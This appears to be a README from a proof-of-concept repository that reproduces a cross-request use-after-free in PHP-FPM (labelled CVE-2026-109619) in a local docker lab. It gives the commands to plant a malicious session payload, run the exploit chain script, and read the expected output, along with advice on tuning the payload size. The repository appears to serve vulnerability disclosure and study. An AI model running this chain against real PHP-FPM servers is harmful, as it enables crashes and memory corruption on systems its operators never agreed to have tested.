# Phase E: FPM stale BG UAF

The why, and why the destructor fire stops short on stock FPM, is in the root
[README](../README.md). This folder reproduces the cross-request use-after-free.
FPM behind nginx on `http://127.0.0.1:8084`. Authorised testing only.

`plant_e.php` seeds the malicious session with a local file write. On its own
this producer is not pre-auth: the consumer request is, but the gadget-plus-bomb
session has to be put on disk first. The root README covers the caveat and the
route to reach it pre-auth (phase C as the session-write, or flaky
`upload_progress` accumulation).

## Setup

The producer and consumer have to hit the same worker. On a default pool that
means saturation (see phase D). To reproduce the UAF cleanly, bring it up with
the single-worker override, which pins the pool to one worker (a study aid, not a
condition of the bug):

    docker compose -f docker-compose.yml -f docker-compose.single-worker.yml up --build -d

## Run

Plant the session, then run producer and consumer:

    docker compose exec php-fpm php -d memory_limit=-1 \
        /opt/exploit/plant_e.php eprod000000000000000000000x id 60000000 /tmp
    python3 chain_e_stale_bg.py --target http://127.0.0.1:8084

You're after:

    [1] producer: http=200  OOM/decode-fail=yes
    [2] consumer: http=502  stale-BG UAF=YES
    [+] CVE-2026-109619 confirmed: stale BG() use-after-free across FPM requests.

Bomb size matters: at the stock 128M limit, pick N so the file read fits but the
decode's second allocation tips over, roughly 60 to 100 MB. Go too big and it
OOMs at read, before any stale state is left behind.

## Teardown

    docker compose -f docker-compose.yml -f docker-compose.single-worker.yml down
